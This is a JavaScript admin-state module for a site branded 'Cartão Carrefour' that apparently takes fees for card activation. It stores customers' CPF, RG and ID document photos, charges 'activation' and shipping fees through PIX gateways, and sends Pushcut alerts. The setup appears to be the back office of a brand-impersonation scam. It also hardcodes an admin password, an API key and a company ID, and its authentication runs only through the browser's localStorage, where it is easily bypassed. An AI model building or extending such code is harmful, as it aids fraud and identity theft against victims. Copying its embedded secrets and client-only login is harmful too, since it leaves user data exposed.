// Store para administração (pedidos e configurações)
import { create } from 'zustand';

// Funções de persistência no localStorage
const STORAGE_KEY_ORDERS = 'admin_orders';
const STORAGE_KEY_SETTINGS = 'admin_settings';
const STORAGE_KEY_AUTH = 'admin_auth';

// Helper para ler do localStorage
const getStoredOrders = () => {
  try {
    const stored = localStorage.getItem(STORAGE_KEY_ORDERS);
    console.log('📂 [AdminStore] Carregando pedidos do localStorage...');

    if (!stored) {
      console.log('ℹ️ [AdminStore] Nenhum pedido encontrado no localStorage');
      return [];
    }

    const orders = JSON.parse(stored);
    console.log(`✅ [AdminStore] ${orders.length} pedidos carregados do localStorage`);
    return orders;
  } catch (e) {
    console.error('❌ [AdminStore] Erro ao ler pedidos do localStorage:', e);
    return [];
  }
};

const getStoredSettings = () => {
  try {
    const stored = localStorage.getItem(STORAGE_KEY_SETTINGS);
    if (!stored) return getDefaultSettings();

    // Merge stored settings with defaults to ensure new fields (like shippingOptions) exist
    const parsed = JSON.parse(stored);
    const defaults = getDefaultSettings();

    return {
      ...defaults,
      ...parsed,
      fees: {
        ...defaults.fees,
        ...parsed.fees,
        // Ensure shippingOptions exists if it was missing in stored fees
        shippingOptions: parsed.fees?.shippingOptions || defaults.fees.shippingOptions
      },
      general: {
        ...defaults.general,
        ...parsed.general
      },
      notifications: {
        ...defaults.notifications,
        ...parsed.notifications
      }
    };
  } catch (e) {
    console.error('Erro ao ler configurações do localStorage:', e);
    return getDefaultSettings();
  }
};

const getDefaultSettings = () => ({
  // Gateway
  gateway: {
    activeProvider: 'vennox', // 'vennox' or 'bestfy'
    secretKey: import.meta.env.VITE_VENNOX_SECRET_KEY || '',
    companyId: import.meta.env.VITE_VENNOX_COMPANY_ID || 'a5d1078f-514b-45c5-a42f-004ab1f19afe',
    bestfy: {
      secretKey: '', // Key must be configured in Admin Panel
    },
    enabled: true,
  },
  // Taxas
  fees: {
    activationFee: 25.50,
    shippingOptions: [
      {
        id: 'carta-registrada',
        title: 'Carta Registrada',
        description: 'Entrega em até 15 dias úteis',
        price: 25.50,
        active: true,
      },
      {
        id: 'sedex',
        title: 'Sedex Expresso',
        description: 'Entrega expressa em até 5 dias úteis',
        price: 32.90,
        active: true,
      },
    ],
  },
  // Notificações Pushcut
  notifications: {
    pushcutApiKey: 'XPTr5Kloj05Rr37Saz0D1',
    pushcutBaseUrl: 'https://api.pushcut.io',
    notificationPendente: {
      name: 'Pendente delivery',
      title: '🛒 Novo Pedido de Cartão Carrefour',
      textTemplate: 'Um novo pedido foi gerado! 💰 Valor: R$ {valor} 📋 ID: {transactionId} ⏳ Aguardando confirmação do pagamento PIX para ativar o cartão.',
      enabled: true,
    },
    notificationAprovado: {
      name: 'Aprovado delivery',
      title: '✅ Pagamento Confirmado - Cartão Carrefour',
      textTemplate: 'Pagamento confirmado com sucesso! 💰 Valor: R$ {valor} 📋 ID: {transactionId} 🎉 O cartão será ativado em até 2 minutos. O cliente já pode visualizar os dados do cartão virtual!',
      enabled: true,
    },
  },
  // Configurações gerais
  general: {
    siteName: 'Cartão Carrefour',
    logoUrl: '/images/logocsf.png',
    primaryColor: '#0066CC',
    secondaryColor: '#00AA44',
    kycEnabled: true,
  },
});

export const useAdminStore = create((set, get) => ({
  // Estado de autenticação
  isAuthenticated: false,
  adminPassword: null,

  // Pedidos
  orders: getStoredOrders(),

  // Configurações e Estado de Carga
  settings: getStoredSettings(),
  isLoadingSettings: true, // Começa carregando para evitar uso de defaults antes do fetch

  // ACTIONS

  // Inicializar store (buscar settings do backend)
  init: async () => {
    try {
      set({ isLoadingSettings: true });
      console.log('🔄 [AdminStore] Buscando configurações globais...');

      const response = await fetch('/api/settings');
      if (response.ok) {
        const globalSettings = await response.json();

        if (globalSettings && Object.keys(globalSettings).length > 0) {
          console.log('✅ [AdminStore] Configurações globais carregadas!');

          // Merge profundo com defaults para garantir que novos campos existam
          const defaults = getDefaultSettings();
          const merged = {
            ...defaults,
            ...globalSettings,
            gateway: { ...defaults.gateway, ...globalSettings.gateway },
            fees: { ...defaults.fees, ...globalSettings.fees },
            notifications: { ...defaults.notifications, ...globalSettings.notifications },
            general: { ...defaults.general, ...globalSettings.general }
          };

          set({ settings: merged });
          localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(merged));
        } else {
          console.log('ℹ️ [AdminStore] Nenhuma configuração global encontrada (usando padrão).');
        }
      }
    } catch (error) {
      console.error('❌ [AdminStore] Erro ao buscar configurações:', error);
    } finally {
      set({ isLoadingSettings: false });
    }
  },

  // Actions - Autenticação
  login: (password) => {
    // Senha padrão: "admin123" (em produção, usar hash)
    const defaultPassword = 'Hornet600@';
    if (password === defaultPassword) {
      set({ isAuthenticated: true });
      localStorage.setItem(STORAGE_KEY_AUTH, JSON.stringify({ authenticated: true, timestamp: Date.now() }));
      return true;
    }
    return false;
  },

  logout: () => {
    set({ isAuthenticated: false });
    localStorage.removeItem(STORAGE_KEY_AUTH);
  },

  checkAuth: () => {
    try {
      const auth = localStorage.getItem(STORAGE_KEY_AUTH);
      if (auth) {
        const { authenticated, timestamp } = JSON.parse(auth);
        // Sessão expira em 24 horas
        if (authenticated && Date.now() - timestamp < 24 * 60 * 60 * 1000) {
          set({ isAuthenticated: true });
          return true;
        }
      }
    } catch (e) {
      console.error('Erro ao verificar autenticação:', e);
    }
    return false;
  },

  changePassword: (newPassword) => {
    // Em produção, fazer hash da senha
    set({ adminPassword: newPassword });
    return true;
  },

  // Actions - Pedidos
  addOrder: (orderData) => {
    console.log('📝 [AdminStore] Adicionando novo pedido:', {
      transactionId: orderData.transactionId,
      nomeCompleto: orderData.nomeCompleto,
      valorEntrega: orderData.valorEntrega,
      rg: orderData.rg || 'N/A',
      hasPhotoFront: !!orderData.documentPhotoFront,
      hasPhotoBack: !!orderData.documentPhotoBack
    });

    // Verificar se já existe pedido com este transactionId
    const existingOrder = get().orders.find(o => o.transactionId === orderData.transactionId);
    if (existingOrder) {
      console.warn('⚠️ [AdminStore] Pedido duplicado detectado, ignorando criação:', orderData.transactionId);
      return existingOrder;
    }

    const newOrder = {
      id: crypto.randomUUID(),
      ...orderData,
      status: 'pendente',
      createdAt: new Date().toISOString(),
      pixCopiado: false,
    };

    const orders = [...get().orders, newOrder];
    set({ orders });

    // Salvar no localStorage com verificação
    try {
      localStorage.setItem(STORAGE_KEY_ORDERS, JSON.stringify(orders));
      console.log('✅ [AdminStore] Pedido salvo no localStorage. Total de pedidos:', orders.length);
      console.log('✅ [AdminStore] Pedido ID:', newOrder.id);

      // Verificar se foi salvo corretamente
      const saved = localStorage.getItem(STORAGE_KEY_ORDERS);
      if (!saved) {
        console.error('❌ [AdminStore] ERRO: localStorage não salvou o pedido!');
      }
    } catch (error) {
      console.error('❌ [AdminStore] Erro ao salvar no localStorage:', error);
    }

    return newOrder;
  },

  updateOrder: (orderId, updates) => {
    const orders = get().orders.map((order) =>
      order.id === orderId ? { ...order, ...updates, updatedAt: new Date().toISOString() } : order
    );
    set({ orders });
    localStorage.setItem(STORAGE_KEY_ORDERS, JSON.stringify(orders));
  },

  deleteOrder: (orderId) => {
    const orders = get().orders.filter((order) => order.id !== orderId);
    set({ orders });
    localStorage.setItem(STORAGE_KEY_ORDERS, JSON.stringify(orders));
  },

  getOrder: (orderId) => {
    return get().orders.find((order) => order.id === orderId);
  },

  getOrderByTransactionId: (transactionId) => {
    return get().orders.find((order) => order.transactionId === transactionId);
  },

  // Buscar pedidos do banco de dados
  fetchOrders: async () => {
    try {
      console.log('📥 [AdminStore] Buscando pedidos do banco de dados...');

      const response = await fetch('/api/get-orders');

      if (!response.ok) {
        console.warn(`⚠️ [AdminStore] API retornou ${response.status}, usando localStorage`);
        return get().orders;
      }

      const orders = await response.json();
      console.log(`✅ [AdminStore] ${orders.length} pedidos carregados do banco`);

      // Mesclar com localStorage (manter ambos)
      const localOrders = get().orders;
      const allOrders = [...orders];

      // Adicionar pedidos do localStorage que não estão no banco
      localOrders.forEach(localOrder => {
        if (!allOrders.find(o => o.transactionId === localOrder.transactionId)) {
          console.log('📌 [AdminStore] Adicionando pedido do localStorage:', localOrder.transactionId);
          allOrders.push(localOrder);
        }
      });

      set({ orders: allOrders });

      // Salvar no localStorage também
      localStorage.setItem(STORAGE_KEY_ORDERS, JSON.stringify(allOrders));
      console.log(`💾 [AdminStore] Total de ${allOrders.length} pedidos (DB + Local)`);

      return allOrders;
    } catch (error) {
      console.error('❌ [AdminStore] Erro ao buscar pedidos:', error);
      // Manter pedidos do localStorage em caso de erro
      return get().orders;
    }
  },

  // Busca detalhes completos de um único pedido (incluindo fotos)
  fetchOrderDetails: async (orderId) => {
    try {
      console.log(`📥 [AdminStore] Buscando detalhes do pedido ${orderId}...`);
      const response = await fetch(`/api/get-orders?id=${orderId}`);

      if (!response.ok) {
        throw new Error('Falha ao buscar detalhes do pedido');
      }

      const fullOrder = await response.json();
      console.log('✅ [AdminStore] Detalhes carregados com sucesso');

      // Atualizar o pedido na lista existente
      const orders = get().orders.map(o => o.id === fullOrder.id ? { ...o, ...fullOrder } : o);

      // Se não existir na lista (ex: link direto sem passar pela lista), adiciona
      if (!orders.find(o => o.id === fullOrder.id)) {
        orders.push(fullOrder);
      }

      set({ orders });
      // Opcional: Salvar no localStorage (cuidado com o tamanho das fotos repetidas)
      // localStorage.setItem(STORAGE_KEY_ORDERS, JSON.stringify(orders)); 
      // Melhor não salvar Base64 gigante no localStorage padrão para não estourar cota.

      return fullOrder;
    } catch (error) {
      console.error('❌ [AdminStore] Erro ao buscar detalhes:', error);
      return null;
    }
  },

  // Actions - Configurações
  updateSettings: (category, updates) => {
    const settings = {
      ...get().settings,
      [category]: {
        ...get().settings[category],
        ...updates,
      },
    };
    set({ settings });
    localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(settings));

    // Persistir no Backend (Assíncrono)
    fetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(settings)
    }).catch(err => console.error('❌ Erro ao salvar settings no backend:', err));
  },

  updateGatewaySettings: (updates) => {
    get().updateSettings('gateway', updates);
  },

  updateFeeSettings: (updates) => {
    get().updateSettings('fees', updates);
  },

  updateNotificationSettings: (notificationType, updates) => {
    const settings = { ...get().settings };
    if (notificationType === 'notificationPendente' || notificationType === 'notificationAprovado') {
      settings.notifications[notificationType] = {
        ...settings.notifications[notificationType],
        ...updates,
      };
    } else if (notificationType === 'pushcutApiKey') {
      settings.notifications.pushcutApiKey = updates.pushcutApiKey || updates;
    } else if (notificationType === 'pushcutBaseUrl') {
      settings.notifications.pushcutBaseUrl = updates.pushcutBaseUrl || updates;
    } else {
      settings.notifications[notificationType] = updates;
    }
    set({ settings });
    localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(settings));
  },

  updateGeneralSettings: (updates) => {
    get().updateSettings('general', updates);
  },

  // Actions - Notificações
  sendNotification: async (orderId, notificationType = 'pendente') => {
    const order = get().getOrder(orderId);
    if (!order) return false;

    const settings = get().settings;
    const notificationConfig = notificationType === 'pendente'
      ? settings.notifications.notificationPendente
      : settings.notifications.notificationAprovado;

    if (!notificationConfig.enabled) {
      console.log('Notificação desabilitada');
      return false;
    }

    try {
      const { pushcutApiKey, pushcutBaseUrl } = settings.notifications;
      const url = `${pushcutBaseUrl}/${pushcutApiKey}/notifications/${encodeURIComponent(notificationConfig.name)}`;

      // Substituir variáveis no template
      const text = notificationConfig.textTemplate
        .replace('{valor}', order.valorEntrega?.toFixed(2).replace('.', ',') || '0,00')
        .replace('{transactionId}', order.transactionId?.substring(0, 8) || 'N/A')
        .replace('{nome}', order.nomeCompleto || 'Cliente')
        .replace('{cpf}', order.cpf || 'N/A');

      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          title: notificationConfig.title,
          text: text,
        }),
      });

      if (response.ok) {
        console.log('Notificação enviada com sucesso');
        return true;
      }
    } catch (error) {
      console.error('Erro ao enviar notificação:', error);
    }
    return false;
  },
}));

